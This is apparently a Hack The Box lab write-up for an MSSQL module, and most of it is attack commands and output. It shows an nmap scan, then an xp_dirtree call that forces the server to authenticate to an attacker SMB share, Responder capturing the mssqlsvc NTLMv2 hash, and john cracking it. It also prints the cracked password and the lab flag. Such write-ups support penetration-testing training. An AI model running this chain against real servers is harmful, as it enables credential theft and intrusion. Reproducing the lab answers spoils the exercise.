# SQL Databases

### What is the password for the "mssqlsvc" user?

```bash
nmap -sC -sV 10.129.203.12 -Pn
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: WIN-02, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp  open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
143/tcp  open  imap          hMailServer imapd
|_imap-capabilities: CHILDREN ACL NAMESPACE IMAP4 SORT completed RIGHTS=texkA0001 OK CAPABILITY IMAP4rev1 IDLE QUOTA
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: WIN-02, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.203.12:1433: 
|     Target_Name: WIN-02
|     NetBIOS_Domain_Name: WIN-02
|     NetBIOS_Computer_Name: WIN-02
|     DNS_Domain_Name: WIN-02
|     DNS_Computer_Name: WIN-02
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.203.12:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-02-22T12:45:56
|_Not valid after:  2054-02-22T12:45:56
|_ssl-date: 2024-02-22T12:48:21+00:00; 0s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-02
|   NetBIOS_Domain_Name: WIN-02
|   NetBIOS_Computer_Name: WIN-02
|   DNS_Domain_Name: WIN-02
|   DNS_Computer_Name: WIN-02
|   Product_Version: 10.0.17763
|_  System_Time: 2024-02-22T12:48:16+00:00
| ssl-cert: Subject: commonName=WIN-02
| Not valid before: 2024-02-21T12:45:50
|_Not valid after:  2024-08-22T12:45:50
|_ssl-date: 2024-02-22T12:48:21+00:00; 0s from scanner time.
Service Info: Host: WIN-02; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Authenticate to 10.129.203.12 with user "htbdbuser" and password "MSSQLAccess01!"

```sql
#first we login with the provided creds
impacket-mssqlclient -p 1433 htbdbuser@10.129.5.2
EXEC master..xp_dirtree '\\10.10.15.43\share\'
#now we set up responder to catch the nt hash
sudo responder -I tun0 -e 10.129.5.2
#[SMB] NTLMv2-SSP Client   : 10.129.5.2
#[SMB] NTLMv2-SSP Username : WIN-02\mssqlsvc
#[SMB] NTLMv2-SSP Hash     : mssqlsvc::WIN-02:448afdd065d8f337:DADD3C28CD1089F96AE3E31AB8724F9B:010100000000000080177F307765DA01DDB732F9FB3BD9950000000002000800560038003400390001001E00570049004E002D0045005A0058003800340034004C003200560049004A0004003400570049004E002D0045005A0058003800340034004C003200560049004A002E0056003800340039002E004C004F00430041004C000300140056003800340039002E004C004F00430041004C000500140056003800340039002E004C004F00430041004C000700080080177F307765DA0106000400020000000800300030000000000000000000000000300000B8CFE0AAEF7CD18431A4A886B3D22BB9724165B5F697C9772D45518BD200D2EA0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00340033000000000000000000   
```

now we crack this nt hash

```bash
vim mssqlsvc.hash
john --wordlist=../passwords.list mssqlsvc.hash 
princess1        (mssqlsvc)     
```

princess1

### Enumerate the "flagDB" database and submit a flag as your answer.

```sql
impacket-mssqlclient mssqlsvc@10.129.5.2 -windows-auth
SELECT name FROM master.dbo.sysdatabases
use flagDB
select * from tb_flag
b'HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}'   
```

HTB{!_l0v3_#4$#!n9\_4nd\_r3$p0nd3r}
